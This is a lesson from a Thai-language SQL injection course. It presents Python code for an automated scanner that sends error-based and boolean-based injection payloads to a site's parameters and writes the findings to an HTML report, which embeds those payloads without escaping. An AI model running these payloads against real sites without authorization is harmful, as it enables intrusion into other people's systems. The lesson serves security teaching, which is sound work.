# Part 097: SQL Injection Automation Framework

## ภาพรวม

สร้าง framework อัตโนมัติสำหรับตรวจสอบ SQL injection แบบสมบูรณ์

**ขั้นตอนที่ 1526-1540**

---

## 1526. Framework Architecture

```
SQLi Automation Framework:

┌──────────────────┐
│   Config Layer    │ <- targets, options, output format
└──────┬───────┘
               │
       ┌─────┴─────┐
       │  Orchestrator  │
       └─────┬─────┘
               │
   ┌───────┬───────┐
   │           │           │
┌─┴───┐  ┌─┴───┐  ┌─┴───┐
│Crawler│  │Detect │  │Exploit│
└─────┘  └─────┘  └─────┘
               │
       ┌─────┴─────┐
       │  Reporter       │
       └────────────┘
```

---

## 1527. Core Engine

```python
from dataclasses import dataclass, field
from typing import Optional
import requests
import json

@dataclass
class ScanTarget:
    url: str
    method: str = 'GET'
    params: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    data: dict = field(default_factory=dict)

@dataclass
class Finding:
    target: ScanTarget
    param: str
    technique: str
    payload: str
    evidence: str
    severity: str = 'HIGH'

class SQLiEngine:
    def __init__(self, timeout: int = 10, delay_threshold: float = 3.0):
        self.timeout = timeout
        self.delay_threshold = delay_threshold
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Security-Scanner/1.0'})
    
    def baseline(self, target: ScanTarget, param: str) -> tuple:
        """Get baseline response"""
        params = {**target.params, param: 'test'}
        r = self.session.request(target.method, target.url, params=params,
                                  timeout=self.timeout)
        return r.status_code, len(r.text), r.text[:500]
    
    def test_error(self, target: ScanTarget, param: str) -> Optional[Finding]:
        """Error-based detection"""
        ERROR_PAYLOADS = ["'", "''", "'\\ ", "';", "') OR ('1"]
        ERROR_SIGS = ['you have an error', 'syntax error', 'mysql_fetch',
                      'ORA-', 'pg_query', 'SQLSTATE', 'unclosed quotation']
        
        base_status, base_len, _ = self.baseline(target, param)
        
        for payload in ERROR_PAYLOADS:
            params = {**target.params, param: payload}
            try:
                r = self.session.request(target.method, target.url, params=params,
                                          timeout=self.timeout)
                for sig in ERROR_SIGS:
                    if sig.lower() in r.text.lower():
                        return Finding(
                            target=target, param=param, technique='error-based',
                            payload=payload, evidence=sig
                        )
            except Exception:
                continue
        return None
    
    def test_boolean(self, target: ScanTarget, param: str) -> Optional[Finding]:
        """Boolean-based detection"""
        base_val = 'test'
        base_status, base_len, _ = self.baseline(target, param)
        
        true_payload = base_val + "' AND '1'='1"
        false_payload = base_val + "' AND '1'='2"
        
        params_true = {**target.params, param: true_payload}
        params_false = {**target.params, param: false_payload}
        
        r_true = self.session.request(target.method, target.url, params=params_true, timeout=self.timeout)
        r_false = self.session.request(target.method, target.url, params=params_false, timeout=self.timeout)
        
        if abs(len(r_true.text) - len(r_false.text)) > 50:
            return Finding(
                target=target, param=param, technique='boolean-based',
                payload=true_payload,
                evidence=f'true_len={len(r_true.text)} false_len={len(r_false.text)}'
            )
        return None
    
    def scan(self, target: ScanTarget) -> list:
        findings = []
        for param in list(target.params.keys()):
            for test in [self.test_error, self.test_boolean]:
                result = test(target, param)
                if result:
                    findings.append(result)
                    break
        return findings
```

---

## 1528. Report Generator

```python
import json
from datetime import datetime

class HTMLReporter:
    def generate(self, findings: list, output_path: str):
        rows = ''
        for f in findings:
            rows += f"""
            <tr>
              <td>{f.param}</td>
              <td>{f.technique}</td>
              <td><code>{f.payload[:60]}</code></td>
              <td>{f.evidence[:80]}</td>
              <td class="{f.severity.lower()}">{f.severity}</td>
            </tr>"""
        
        html = f"""<!DOCTYPE html>
<html><head><title>SQLi Scan Report</title><style>
  body {{ font-family: Arial; margin: 20px; }}
  table {{ border-collapse: collapse; width: 100%; }}
  th, td {{ border: 1px solid #ddd; padding: 8px; }}
  .high {{ color: red; font-weight: bold; }}
  .medium {{ color: orange; }}
  .low {{ color: green; }}
</style></head><body>
<h1>SQL Injection Scan Report</h1>
<p>Generated: {datetime.now().isoformat()}</p>
<p>Total findings: {len(findings)}</p>
<table>
  <tr><th>Parameter</th><th>Technique</th><th>Payload</th><th>Evidence</th><th>Severity</th></tr>
  {rows}
</table>
</body></html>"""
        
        with open(output_path, 'w') as f:
            f.write(html)
        print(f"Report written to {output_path}")

# Usage:
engine = SQLiEngine()
target = ScanTarget(
    url='http://example.com/search',
    params={'q': 'test', 'category': '1'}
)
findings = engine.scan(target)

reporter = HTMLReporter()
reporter.generate(findings, '/tmp/sqli-report.html')
```

---

## สรุป

Automation Framework:
- **Architecture** - Crawler/Detect/Exploit/Reporter
- **SQLiEngine** - error + boolean detection
- **ScanTarget/Finding** - dataclasses
- **HTMLReporter** - generate HTML report

---

*Part 097 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
